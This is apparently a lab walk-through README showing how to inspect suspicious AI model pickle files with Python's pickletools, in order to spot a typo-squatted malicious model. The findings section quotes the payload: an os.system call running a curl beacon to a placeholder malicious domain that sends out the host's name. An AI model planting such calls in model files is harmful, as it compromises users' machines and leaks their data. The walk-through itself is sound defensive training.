<h1>Investigating a Malicious AI Model Pickle File with Python's <b>pickletools</b></h1>

<h2>Walk-through Description</h2>
This is a walk-through of how to disassemble suspicious AI model serialized pickle files <b>(.pkl)</b> to inspect their code without executing it. This uses Python's built-in module called <b>pickletools</b> and is part of TryHackMe's "Supply Chain Attack Vectors" room on the AI Security pathway. Malicious attackers can pack malicious code in pickle files, upload them on the AI model file download site Hugging Face, and market them as professional files for use locally on your IT infrastructure. When malicious pickle files are loaded (when they are deserialized/unpacked) using the Python command <b>pickle.load()</b>, Python doesn't automatically check them for malicious code. Attackers take advantage of this and can include malicious code in the pickle file that opens a reverse shell on your local machine running the model, giving them full remote access to your machine. They can also include code which exfiltrates your data, installs cryptominers to co-opt your machine's processing power to mine cryptocurrency, or perform reconnaissance to map out the usernames, hostnames, and running processes in your local network.

<h2>Steps of the Investigation</h2>

<b>1. See what files are to be investigated in this lab</b>

I started by investigating the lab model files in this Linux virtual machine.

<p align="center">
<br/>
<img src="https://i.imgur.com/e4MgnnK.png" height="100%" width="100%" alt="Read the lab files image"/>
</p>

<b>2. Check the permissions and size of the AI model files</b>

I then looked at the permissions and file sizes of the specific AI model pickle files that I would be inspecting: the <b>code_reviewer.pkl</b> file and the <b>code_reviewer_v1.pkl</b> file.

I used the following command:
<pre><b>ls -lh /opt/supply-chain/models/code_reviewer.pkl /opt/supply-chain/models/code_reviewer_v1.pkl</b></pre>

<p align="center">
<br/>
<img src="https://i.imgur.com/oq873ax.png" height="100%" width="100%" alt="Look at the model file permissions and file sizes image"/>
</p>

One of these files is malicious and one is clean, and the one that is malicious is using a method called "typo-squatting." This is where the attacker makes a malicious file that has a filename almost exactly the same as the legitimate, clean one. Unknowing seekers of the legitimate file on Hugging Face then may mistakenly download the malicious file thinking it is the legitimate one and expose their computers to the exploits of the attacker. 

In this case, the <b>code_reviewer.pkl</b> file is <b>6.1M</b> larger than the <b>code_reviewer.v1.pkl</b> file. That doesn't mean that it absolutely is the malicious one but it certainly is suspicious and should be investigated.

<b>3. Check the file type</b>

The next thing I did in the lab is investigate the <b>file</b> type using the file command, which shows both of the pickle files as "data". 

I issued the command:

<pre><b>file /opt/supply-chain/models/code_reviewer.pkl /opt/supply-chain/models/code_reviewer_v1.pkl</b></pre>

<p align="center">
<br/>
<img src="https://i.imgur.com/NxTt6Xb.png" height="100%" width="100%" alt="Check the file type image"/>
</p>

<b>4. Investigate the contents of the pickle file without executing it</b>

I then used a built-in Python module called <b>pickletools</b> which can disassemble the contents of pickle files without executing the code in them. 

The first AI model file that I inspected was the larger one: <b>code_reviewer.pkl</b> by issuing the command 

<pre><b>python3 -m pickletools [filepath] 2>&1 | head -30</b></pre>

<pre><b>python3</b>          #this tells the VM to use Python
<b>-m pickletools</b>   #run pickletools as a program
<b>2>&1</b>             #show me all the errors from the error stream along with the returned results
<b>|</b>                #take the output of what comes before the pipe and send it to what comes after
<b>head -30</b>         #show me the top 30 results</b></pre>

<p align="center">
<br/>
<img src="https://i.imgur.com/wZC8jqn.png" height="100%" width="100%" alt="Use pickletools to disassemble contents image"/>
</p>

<b>Findings: This AI model file is malicious</b>

<b>'os'</b>  - This pickle file contains code to access the system's 'os' (operating system) which is not typical of AI model files. 

<b>'system'</b> - It accesses the os.system which executes shell commands

<b>curl #maliciousdomain/beacon?host=$(hostname)</b> - it is sending out beacon messages to an external domain

Legitimate pickle files should never access os or system, or issue curl commands.

By comparison, when we check the other model file <b>code_reviewer_v1.pkl</b> we don't see any of this malicious beaconing code or os or system access:

<pre><b>python3 -m pickletools /opt/supply-chain/models/code_reviewer_v1.pkl 2>&1 | head -30</b></pre>

<p align="center">
<br/>
<img src="https://i.imgur.com/n9Spkvj.png" height="100%" width="100%" alt="Investigate the clean pickle file image"/>
</p>

<h2>Summary</h2>
This lab walk-through shows how to use the Python module <b>pickletools</b> to examine the contents of a pickle AI model file without executing the code in the file. It shows that AI model files from untrusted sources can embed malicious code which can execute system commands on local systems when loaded and exfiltrate information to destinations outside of your organization. To prevent a pickle-based attack, you can choose to use SafeTensors models instead, though these do not prevent other malicious attacks, for instance Keras Lambda Layers attacks at the model architecture level.   



<!--
 ```diff
- text in red
+ text in green
! text in orange
